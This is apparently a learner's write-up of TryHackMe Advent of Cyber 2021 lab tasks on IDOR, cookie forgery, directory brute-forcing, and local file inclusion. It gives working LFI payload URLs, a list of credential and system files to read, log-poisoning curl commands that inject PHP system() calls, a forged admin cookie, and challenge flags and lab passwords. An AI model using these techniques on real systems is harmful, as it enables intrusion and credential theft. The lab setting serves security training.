# Advent of Cyber 2021

## Save The Gifts

### What is an IDOR Vulnerability?
Insecure Direct Object Reference (IDOR)<br>
Type of access control vulnerability. This is when an attacker can gain access to information or actions not intended for them. Occurs when a web services receives user-supplied input to retreive objects (files, data, documents, etc), and too much trust is placed on user input.<br>

### How do I find and exploit IDOR vulnerabilities?
User supplied data can be found in three main places:<br>
1. Query Component
```
https://website.thm/profile?id=123
```

2. Post Variables
```html
<form method="POST" action="/update-password">
	<input type="hidden" name="user_id" value="123">
	<div>New Password:</div>
	<div><input type="password" name="new_password"></div>
	<div><input type="submit" value="Change Password"></div>
</form>
```
The input field that is hidden allows us to select a different uid. If this is changed, the password for a different user may be reset.<br>

3. Cookies
Cookies typically are used to store user sessions. Less experienced developers may store information in cookies themselves.
```
GET /user-information HTTP/1.1
Host: website.com
Cookie: user_id=123

Hello John!
```

### Challenge
> After finding Santa's account, what is their position at the company?<br>
The Boss!<br>

> After finding McStocker's account, what is their position in the company?<br>
Build Manager<br>

> After finding the account responsible for tampering, what is their position in the company?<br>
Mischief Manager<br>

> What is the received flag when McSkidy fixes the Inventory Management System?<br>
THM{AOC_IDOR_2B34BHI3}<br>

### Conclusion
Learn more about IDOR: https://tryhackme.com/room/idor

## ELF HR Problems

### HTTP(S)
HTTP is a client-server protocol which provides communication between client and server. Similar to a TCP request; however, HTTP adds specific headers to the request to identify the protocol and other information.<br>
There are two parts of a HTTP header: the method and target. The target specifies what to retrieve from the server, while the method specifies how. 
Example GET request.
```
GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/
```
Example Response:
```HTML
HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Wednesday, 24 Nov 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

<html>
	<head>
	    <title>Advent of Cyber</title>
	</head>
	<body>
	    Welcome To Advent of Cyber!
	</body>
</html>
```

### Cookies
HTTP is a stateless protocol. Web servers cannot differentiate from individuals. Cookies are assigned to create and manage a stateful session between client and server.<br>

### Cookie Manipulation
Taking a cookie and modifying it to obtain unintended behavior. This is possible because cookies are stored on your machine locally. Cookies may seem random at first; however, they often have an encoded value or meaning behind them that can be decoded to a non-arbritrary value such as a Javascript object.<br>

Below is a summary of how cookie values could be manipulated.<br>
1. Obtain a cookie value from registering or signing up for an account.
2. Decode the cookie value.
3. Identify the object notation or structure of the cookie.
4. Change the parameters inside the object to a different parameter with a higher privilege level, such as admin or administrator.
5. Re-encode the cookie and insert the cookie into the value space; this can be done by double-clicking the value box.
6. Action the cookie; this can be done by refreshing the page or logging in.

### Challenge

> What is the name of the new cookie that was created for your account?<br>
user-auth<br>

> What encoding type was used for the cookie value?<br>
hexadecimal<br>

> What object format is the data of the cookie stored in?<br>
JSON<br>

> What is the value of the administrator cookie? (username = admin)<br>
7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d<br>

> What team environment is not responding?<br>
HR<br>

> What team environment is not responding?<br>
Application<br>

### Conclusion
Learn more about authentication bypass here: https://tryhackme.com/jr/authenticationbypass  

## Christmas Blackout

### Content Discovery
Content is the assets and inner workings of the application that we are testing. Contents can be files, folders, or pathways that weren't necessarily intended to be accessed by the general public. Content discovery is a useful technique to have in our arsenal because it allows us to find things that we aren't supposed to see. For example, we may be able to find:<br>
* Configuration Files
* Passwords and Secrets
* Backups
* Content management systems
* Administrative dashboard or portals
We can use applications such as dirbuster or gobuster to scan for directories and files on a web server.<br>
Here is a good place to find wordlists. Your ability to find content is only as good as your wordlist: https://github.com/danielmiessler/SecLists

### Challenge
> Using a common wordlist for discovering content, enumerate http://10.10.14.123 to find the location of the administrator dashboard. What is the name of the folder?
I ran:
```bash
gobuster dir -u http://10.10.14.123 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php -o christmas.gob

/index.html           (Status: 200) [Size: 5061]
/admin                (Status: 301) [Size: 312] [--> http://10.10.14.123/admin/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.14.123/assets/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.14.123/javascript/]
```
admin<br>

> In your web browser, try some default credentials on the newly discovered login form for the "administrator" user. What is the password?
administrator:administrator<br>

> Access the admin panel. What is the value of the flag?
THM{ADM1N_AC3SS}<br>

## Patch Management is Hard
This focuses on local file inclusions. Since I know LFI pretty well I will only focus on the aspects I don't understand as well. To start, the concept of exploiting using LFI PHP filters<br>
Typically, LFI's occur when something like the following is written:
```php
<?php 
	include($_GET["file"])
?>
```
In addition, other entry points can be used depending upon the web application, such as the User-Agent, Cookies, sessions and other HTTP headers.<br>
Some files and directories of interest:
* /etc/issue
* /etc/passwd
* /etc/shadow
* /etc/group
* /etc/hosts
* /etc/motd
* /etc/mysql/my.cnf
* /proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
* /proc/self/environ
* /proc/version
* /proc/cmdline

Since PHP is a server side mechanism, the client never is able to see the PHP code. However, we can use the PHP filter wrapper to read the actual contents of the PHP file. In typical cases, it is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. However, we are able to display PHP in other forms such as Base64 and ROT13<br>
```
http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

Next, take a look at log poisoning. The attacker needs to include a malicious payload into services log files such as Apache, SSH, etc. Then, the LFI vulnerability is used to request the page that includes the malicious payload. I can send:<br>
```bash
curl -A "This is testing" http://10.10.62.229/login.php
```
And the following will appear in the http://10.10.62.229/logs.php
```
Guest:172.17.0.1:This is testing:/login.php
```
With this, we can inject PHP code into the logs and then fetch them to run whatever PHP code we want:
```bash
curl -A "<?php phpinfo(); ?>" http://10.10.62.229/login.php
```
And when displaying the log file using LFI we get the generic PHP information page.

### Challenge
> Deploy the attached VM and look around. What is the entry point for our web application? 
err<br>

> Use the entry point to perform LFI to read the /etc/flag file. What is the flag?
Just a simple LFI.<br>
http://10.10.62.229/index.php?err=/etc/flag
THM{d29e08941cf7fe41df55f1a7da6c4c06}<br>

> Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?
Use the previously stated PHP filter wrapper to display the page in Base64<br>
http://10.10.62.229/index.php?err=php://filter/convert.base64-encode/resource=index.php
Although, the only part we care about is the Base64 encoded part:<br>
```
PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+
```
Decoding and writing to a file gets the PHP source code<br>
```php
<?php session_start();
$flag = "THM{791d43d46018a0d89361dbf60d5d9eb8}";
include("./includes/creds.php");
if($_SESSION['username'] === $USER){                        
	header( 'Location: manage.php' );
	die();
} else {
	$labNum = "";
  require "./includes/header.php";
?>
<div class="row">
  <div class="col-lg-12">
  </div>
  <div class="col-lg-8 col-offset-1">
      <?php if (isset($error)) { ?>
          <span class="text text-danger"><b><?php echo $error; ?></b></span>
      <?php }

?>
 <p>Welcome <?php echo getUserName(); ?></p>
	<div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div> 
	</div>
<?php if($errInclude){ include($_GET['err']);} ?>
</div>

<?php
}
?>
```
THM{791d43d46018a0d89361dbf60d5d9eb8}<br>

> Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?
Another simple LFI using the PHP filter technique.<br>
http://10.10.62.229/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php
Which gets:<br>
PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/<br>
Decodes into
```php
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
?
```
> The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log.
I just curled the log file with PHP:
```bash
curl -A "<?php system('uname -a'); ?>" http://10.10.62.229/login.php
```
And used LFI to load the log file and get the flag:
http://10.10.62.229/index.php?err=php://filter/resource=./include/logs/app_access.log
lfi-aoc-awesome-59aedca683fff9261263bb084880c965<br>